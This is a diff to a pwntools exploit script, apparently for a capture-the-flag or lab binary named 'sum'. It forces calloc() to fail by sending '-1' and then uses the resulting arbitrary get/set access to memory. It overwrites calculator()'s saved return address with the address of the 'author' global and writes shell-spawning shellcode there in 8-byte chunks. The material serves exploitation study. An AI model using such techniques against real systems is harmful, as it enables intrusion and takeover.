@@ -53,6 +53,10 @@ io = start()
 # flag = io.recv(...)
 # log.success(flag)
 
+# Address of the 'author' global variable (fixed).
+#   $ objdump -D ./sum | grep author
+author_addr = 0x4040a0
+
 # Prepare the shellcode string (payload), padding that to 8 bytes (with NOPS).
 payload = asm(shellcraft.sh())
 if len(payload) % 8 != 0:
@@ -61,37 +65,50 @@ if len(payload) % 8 != 0:
 # Pointer to the stack location where the return address from calculator()
 # is stored (RIP saved from main). Observed with GDB.
 ptr_to_calculator_ret_addr = 0x7fffffffe7e8
-write_index = ptr_to_calculator_ret_addr/8
 
 # Cause calloc() to fail by passing a giant value.
 # The program does not check that calloc() does not return NULL.
 io.sendline('-1')
-# Overwrite the return address:
+# Now we can read/write the whole process memory using get/set
+# commands.
+
+# Drain program stdout (and echo it for the ease of debugging).
+msg = io.recv()
+print(msg)
+
+read_index = author_addr/8
+cmd = 'get %lu' % (read_index)
+print(cmd)
+io.sendline(cmd)
+msg = io.recv()
+print(msg)
+name_addr_int64_str = msg[:msg.find('\n')]
+name_addr_int64 = int(name_addr_int64_str)
+
+# Overwrite the return address. If the stack is executable we
+# set the return address to point right below the location
+# where the return address itself is stored.
 #     values[write_index] = ptr_to_calculator_ret_addr+8
-# In this case we set the return address to the address right
-# below the overwritten return address (assuming the stack is
-# executable).
-# What if the stack is not executable? We could try to write
-# the payload somewhere else. One idea could be to write the
-# payload in the buffer allocated by getline() (to make sure
-# that enough room is available we could just send an very
-# long and invalid 'get' command, e.g. 'get xxxxxxxxxx[...]').
-# But how can we get the value returned from getline()? We
-# only know that this address is stored at rbp-0x38.
-cmd = 'set %lu %ld' % (write_index, ptr_to_calculator_ret_addr+8)
+# Otherwise if the data segments are executable, we can use
+# the address of the 'author' global variable, which is
+# also fixed.
+#     values[write_index] = author_addr
+write_index = ptr_to_calculator_ret_addr/8
+cmd = 'set %lu %ld' % (write_index, author_addr)
 print(cmd)
 io.sendline(cmd)
 
+write_index = author_addr/8
 # Now we can just write the shellocode starting from the new
 # return address, using the same technique.
 i = 0
 while i < len(payload):
     # Unpack 8 bytes of the shellocode (string --> signed integer)
     payload_qword = u64(payload[i:i+8], sign="signed")
-    write_index += 1
     cmd = 'set %lu %ld' % (write_index, payload_qword)
     print(cmd)
     io.sendline(cmd)
+    write_index += 1
     i += 8
 # Send 'bye' to stop the input loop, and let calculator() return.
 io.sendline('bye')
